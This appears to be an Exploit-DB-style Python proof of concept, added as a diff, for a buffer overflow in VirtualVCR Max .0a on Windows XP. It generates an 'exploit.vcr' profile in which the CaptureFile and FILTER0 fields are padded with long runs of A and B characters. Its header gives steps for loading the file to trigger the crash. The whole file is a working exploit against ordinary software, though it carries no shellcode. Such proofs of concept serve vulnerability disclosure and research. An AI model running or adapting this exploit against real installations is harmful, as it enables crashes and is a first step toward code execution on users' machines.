@@ -1,0 +1,99 @@
+#!/usr/bin/python
+
+# Exploit Title: VirtualVCR-Max .0a Overflow PoC
+# Google Dork: N/A
+# Date: 21/02/2019
+# Exploit Author: Wade Guest
+# Vendor Homepage: http://virtualvcr.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/virtualvcr/
+# Version: Max Version .0a
+# Tested on: Win XP SP3
+# CVE : N/A]
+
+
+# Launch VirtualVCR
+# Run the python script to generate the 'exploit.vcr' file
+# Right-click the icon in the task bar
+# Options -> Load Profile
+# Select 'exploit.vcr'
+# Right-click the icon and select "Settings"
+
+file_content = ""
+file_content += """
+[VirtualVCR]
+AudioInputLevel=200
+SaveCapStats=0
+AlwaysOnTop=0
+HideBars=0
+AudioInputIndex=-1
+ResampleAudioTo=10000000
+AudioResampleType=0
+StreamOffsetType=0
+VideoBrightness=-1
+VideoHue=-1
+VideoContrast=-1
+VideoSaturation=-1
+VideoColour=1
+VideoGamma=-1
+VideoSharpness=-1
+TunerChannel=2
+TunerCountry=61
+TunerInputType=61
+TunerMode=0
+AudioDelay=0
+ShowAudioScope=0
+ShowHistogram=0
+LogAVdiff=0
+UseSmartTee=0
+CapStatRelative=0
+WantCaptureStats=0
+ShowOnStop=0
+TurnOffScrnSaver=1
+AnimateTrayIcon=0
+AVIcompatINDEX=0
+UseAudioResample=0
+SyncUsingStreamOffset=0
+CaptureFile=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+XMLTVFile=
+VideoColourFormat=RGB24
+WantPreview=0
+FrameRate=400000
+UseFrameRate=0
+CaptureAudio=1
+MasterStream=-1
+UseTimeLimit=0
+TimeLimit=0
+CustomWidth=320
+CustomHeight=240
+VideoCompCodec=end
+AudioCompCodec=end
+CompressVideo=0
+CompressAudio=0
+AudioCapabilityIndex=-1
+FreeSpaceLimit=0
+UseFreeSpace=0
+VideoInputIndex=-1
+UsePreFilters=0
+AppendStampToName=0
+Audio_nChannel=2
+Audio_nSamplesPerSec=44100
+Audio_nAvgBytesPerSec=176400
+Audio_nBlockAlign=4
+Audio_wBitsPerSample=16
+Audio_wFormatTag=1
+VideoDevice=0
+AudioDevice=0
+QuitWhenDone=0
+QuitStyle=0
+[Filters]
+FILTER0=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+[ChannelINFO]
+0-ID=-1
+0-MAP=-1
+0-XMLID=none
+0-NAME=none
+"""
+
+
+file = open("exploit.vcr","w+")
+file.write(file_content)
